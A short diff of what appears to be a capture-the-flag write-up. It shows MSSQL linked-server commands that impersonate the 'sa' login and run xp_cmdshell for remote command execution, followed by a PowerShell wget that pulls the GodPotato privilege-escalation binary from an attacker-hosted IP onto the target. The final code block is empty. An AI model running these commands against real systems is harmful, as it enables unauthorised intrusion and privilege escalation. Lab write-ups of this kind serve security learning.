@@ -1101,3 +1101,12 @@ EXEC ('EXECUTE AS LOGIN = ''sa''; EXEC xp_cmdshell ''whoami'';') AT [PRIMARY];
 
 I now have RCE
 
+```python
+EXEC ('EXECUTE AS LOGIN = ''sa''; EXEC xp_cmdshell ''powershell -c wget http://10.10.14.61/GodPotato-NET4.exe -o C:\Users\Public\godpotato.exe'';') AT [PRIMARY];
+```
+
+Ive downloaded godpotato from github and hosted it on a python web server, then ill transfer it to the target
+
+```python
+
+```
